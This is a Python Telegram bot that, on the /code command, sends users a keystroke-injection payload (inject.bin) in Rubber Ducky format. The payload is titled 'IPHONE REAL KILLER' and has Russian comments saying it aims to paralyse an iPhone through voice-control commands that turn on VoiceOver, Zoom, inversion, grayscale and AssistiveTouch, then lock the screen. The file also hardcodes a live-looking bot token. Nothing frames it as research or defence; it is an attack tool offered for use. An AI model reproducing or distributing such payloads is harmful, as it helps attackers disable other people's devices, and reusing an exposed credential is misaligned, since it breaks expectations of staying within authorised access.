#!/usr/bin/env python3
import os
import logging
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc"

DUCKY_SCRIPT = """REM IPHONE REAL KILLER
DELAY 500
GUI r
DELAY 300
STRING voice control
ENTER
DELAY 2000

REM ВКЛЮЧАЕМ VOICEOVER (ЭТО ПАРАЛИЗУЕТ УПРАВЛЕНИЕ)
STRING turn on voiceover
ENTER
DELAY 500

REM ВКЛЮЧАЕМ ZOOM (ЭКРАН СТАНОВИТСЯ НЕУПРАВЛЯЕМЫМ)
STRING turn on zoom
ENTER
DELAY 500

REM ВКЛЮЧАЕМ ИНВЕРТИРОВАНИЕ ЦВЕТОВ
STRING turn on invert colors
ENTER
DELAY 500

REM ВКЛЮЧАЕМ ГРЕЙСКЕЙЛ (ВСЁ СТАНОВИТСЯ Ч/Б)
STRING turn on grayscale
ENTER
DELAY 500

REM ВКЛЮЧАЕМ АССИСТИВ ТАЧ (БЛОКИРУЕТ УПРАВЛЕНИЕ)
STRING turn on assistive touch
ENTER
DELAY 500

REM БЛОКИРУЕМ ЭКРАН НАВСЕГДА
STRING lock screen
ENTER
"""

async def start(update: Update, context):
    await update.message.reply_text("Отправь /code — получу inject.bin")

async def send_code(update: Update, context):
    filename = "inject.bin"
    with open(filename, "w") as f:
        f.write(DUCKY_SCRIPT)
    with open(filename, "rb") as f:
        await update.message.reply_document(document=InputFile(f, filename=filename))
    os.remove(filename)

def main():
    logging.basicConfig(level=logging.INFO)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("code", send_code))
    print("Бот запущен")
    app.run_polling()

if __name__ == "__main__":
    main()
